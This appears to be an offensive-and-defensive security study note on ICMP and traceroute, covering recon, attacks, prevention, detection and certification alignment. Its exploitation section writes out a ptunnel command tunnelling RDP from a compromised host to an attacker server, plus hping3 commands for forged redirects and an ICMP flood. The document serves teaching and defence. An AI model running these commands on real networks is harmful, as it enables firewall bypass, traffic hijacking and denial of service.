# ICMP and Traceroute

## 1. Overview

ICMP (Internet Control Message Protocol, RFC 792 for IPv4, RFC 4443 for ICMPv6) is the control plane of the IP suite. It carries error messages (destination unreachable, time exceeded, redirect) and diagnostic queries (echo request/reply, timestamp). Traceroute builds on ICMP Time Exceeded messages (or UDP port unreachable, or TCP SYN) to map the path between two hosts.

Because ICMP is unauthenticated and often allowed through firewalls for diagnostics, it is abused for host discovery, network mapping, covert tunneling, and denial of service. This file covers the protocol, the offensive techniques, and the defensive controls.

## 2. Reconnaissance / Enumeration

### Host discovery

- `ping -c 4 10.10.10.10` - ICMP echo request; a reply confirms the host is up (unless ICMP is filtered).
- `nmap -sn 10.10.10.0/24` - ping sweep; nmap uses ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp by default.
- `fping -a -g 10.10.10.0/24` - fast parallel ping sweep.

### Path mapping

- `traceroute 10.10.10.10` - UDP-based traceroute (default on Linux).
- `traceroute -I 10.10.10.10` - ICMP-based traceroute.
- `traceroute -T -p 443 10.10.10.10` - TCP SYN traceroute to a specific port; useful when ICMP is filtered.
- `mtr 10.10.10.10` - continuous traceroute with loss/latency statistics per hop.

### OS fingerprinting

- ICMP echo reply TTL reveals the initial TTL (Linux 64, Windows 128, network devices 255).
- ICMP timestamp reply presence/absence helps distinguish OS families.

## 3. Common Attack Vectors

### ICMP tunneling

ICMP echo request/reply payloads can carry arbitrary data. Tools like `ptunnel` and `icmptunnel` encapsulate TCP over ICMP, bypassing firewalls that allow ping but block outbound TCP.

### ICMP redirect abuse

An ICMP redirect tells the victim to use a different gateway for a specific destination. A forged redirect can route traffic through the attacker.

### ICMP flood (Smurf, Ping flood)

A flood of ICMP echo requests can exhaust bandwidth or CPU. The Smurf attack spoofs the source IP as the victim and sends echo requests to a broadcast address; every host on the segment replies to the victim.

### ICMPv6 Router Advertisement spoofing

Forged Router Advertisements (RA) can change the victim's default gateway, DNS server, or IPv6 prefix. This is the IPv6 equivalent of a DHCP spoof.

## 4. Exploitation Recipes

### ICMP tunnel with ptunnel

```bash
# On the attacker's server (public IP 203.0.113.10)
sudo ptunnel -x secret

# On the compromised host, forward local port 3389 to the attacker's RDP
sudo ptunnel -p 203.0.113.10 -lp 3389 -da 10.10.10.20 -dp 3389 -x secret
```

The `-x` value is a shared secret; both sides must match. Traffic between the two hosts is ICMP echo, which many firewalls allow.

### ICMP redirect with hping3

```bash
sudo hping3 -I eth0 -C 5 -K 1 -a 10.10.10.1 -d 100 --icmptype 5 --icmpcode 1 10.10.10.50
```

This sends ICMP redirects to `10.10.10.50` claiming `10.10.10.1` should route through the attacker. Most modern hosts ignore redirects by default (`accept_redirects=0`), so this is mainly a legacy-target technique.

### ICMP flood with hping3

```bash
sudo hping3 --flood --icmp -d 1400 10.10.10.50
```

`--flood` sends packets as fast as possible; `-d 1400` sets a 1400-byte payload. This is a bandwidth DoS, not a stealth technique.

## 5. Post-Exploitation

After establishing an ICMP tunnel, the attacker can:

- Reach internal services that are not exposed to the internet.
- Exfiltrate data via ICMP payloads (slow but hard to block).
- Maintain persistence through a firewall that allows ping.

## 6. Preventive Controls

- **Rate-limit ICMP** on routers and firewalls: `icmp rate-limit 50` on Cisco, or `iptables -A INPUT -p icmp -m limit --limit 10/s -j ACCEPT`.
- **Block ICMP redirects** on hosts: `sysctl -w net.ipv4.conf.all.accept_redirects=0` (default on modern Linux).
- **Block ICMPv6 RA** from untrusted ports via RA Guard on switches.
- **Drop oversized ICMP** (`--icmp-type echo-request -m length --length 1000:65535 -j DROP`) to break tunnels.
- **Egress filtering**: only allow ICMP echo to known destinations if diagnostics are needed.

## 7. Detection Controls

- **Zeek** `icmp` analyzer logs echo requests/replies, unreachable, and redirect messages.
- **NetFlow**: a sudden spike in ICMP echo packets from one host is a tunnel or flood signal.
- **IDS rules** (Suricata/Snort): alert on ICMP payloads larger than 64 bytes, on ICMP redirects, and on ICMP echo to broadcast addresses.
- **Host logs**: `accept_redirects` changes, `ptunnel` process, unusual `ping` volume.

## 8. Verification

- On the host: `sysctl net.ipv4.conf.all.accept_redirects` should be `0`.
- On the router: `show ip icmp rate-limit` confirms rate limiting.
- Test tunnel detection: run `ptunnel` between two lab hosts; the IDS rule should fire on large ICMP payloads.
- Test RA Guard: send a forged RA; the switch should drop it on untrusted ports.

## 9. Case Studies

- **ICMP tunneling in malware (public reporting)**: several APT campaigns used ICMP tunnels for C2 because many networks allow ping. The lesson: ICMP is a data channel, not just a diagnostic.
- **Smurf amplification (historical, 1990s)**: spoofed ICMP echo to broadcast addresses amplified traffic by the number of hosts on the segment. Modern routers disable directed broadcast by default (`no ip directed-broadcast`).

## 10. Legal and Ethical Notes

ICMP tunneling, redirects, and floods on a network you do not own or have explicit written authorization to test are illegal in most jurisdictions. In a penetration test, ICMP-based techniques must be listed in the scope. On public networks, even a ping sweep may violate terms of service.

## 11. References

- RFC 792 (ICMP) - https://www.rfc-editor.org/rfc/rfc792
- RFC 4443 (ICMPv6) - https://www.rfc-editor.org/rfc/rfc4443
- RFC 1812 (Requirements for IP Version 4 Routers) - https://www.rfc-editor.org/rfc/rfc1812
- ptunnel - https://github.com/lnslbrty/ptunnel-ng
- hping3 man page - https://linux.die.net/man/8/hping3
- Zeek ICMP analyzer - https://docs.zeek.org/en/master/scripts/base/protocols/icmp/main.zeek.html
- Cisco ICMP rate limiting - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/ipapp/configuration/15-mt/iap-15-mt-book/iap-icmp.html

## Certification Alignment

- CompTIA Network+ (N10-009): Objective 1.4 (topologies), Objective 5.3 (troubleshooting), Objective 3.2 (attacks)
- Cisco CCNA (200-301): 4.1 (Layer 2 security), 5.5 (security concepts), 1.6 (troubleshooting)
